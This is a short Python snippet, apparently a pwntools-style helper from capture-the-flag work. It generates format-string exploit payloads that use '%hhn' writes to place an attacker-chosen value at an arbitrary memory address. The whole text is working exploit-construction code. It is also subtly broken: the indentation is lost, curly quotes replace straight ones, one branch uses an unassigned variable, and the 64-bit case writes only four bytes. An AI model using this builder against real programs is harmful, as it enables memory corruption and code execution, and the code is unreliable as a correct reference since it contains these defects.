def fmt(prev, word, index):
if prev < word:
result = word - prev
fmtstr = (“%” + str(result) + “c”).encode()
elif prev == word:
result = 0
else:
result = 256 + word - prev
fmtstr = (“%” + str(result) + “c”).encode()
fmtstr += (“%” + str(index) + “$hhn”).encode()
return fmtstr

def fmt_str(offset, size, addr, target):
payload =b””
for i in range(4):
if size == 4:
payload += p32(addr + i)
else:
payload += p64(addr + i)
prev = len(payload)
for i in range(4):
payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
prev = (target >> i * 8) & 0xff
return payload
